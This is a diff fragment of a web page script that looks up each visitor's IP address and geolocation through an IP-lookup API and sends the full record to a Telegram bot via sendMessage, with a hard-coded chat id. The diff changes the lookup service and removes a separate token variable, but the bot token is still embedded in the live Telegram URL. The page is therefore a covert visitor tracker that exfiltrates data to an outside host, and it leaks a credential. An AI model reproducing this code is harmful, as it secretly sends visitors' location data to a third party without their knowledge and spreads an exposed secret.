@@ -130,16 +130,16 @@ li a.active {
                  
          
 
+              
 
-
-              $.getJSON('http://ip-api.com/json', function(data) {
+              $.getJSON('https://ipapi.co/json/', function(data) {
               console.log(JSON.stringify(data, null, 2));
               let output1=JSON.stringify(data, null, 2)
               
-              document.getElementById("gfg").innerHTML=data.query
-              console.log(data.query)
+              document.getElementById("gfg").innerHTML=data.ip
+              console.log(data.ip)
 
-              var token="5763359618:AAGJnlCnJx7mNq7nRlDRPr1sBcFZ7dFqs7w"
+              
               var chat_ıd=1102385447
 
               var url='https://api.telegram.org/bot5763359618:AAGJnlCnJx7mNq7nRlDRPr1sBcFZ7dFqs7w/sendMessage?chat_id=1102385447&text='+JSON.stringify(data, null, 2)
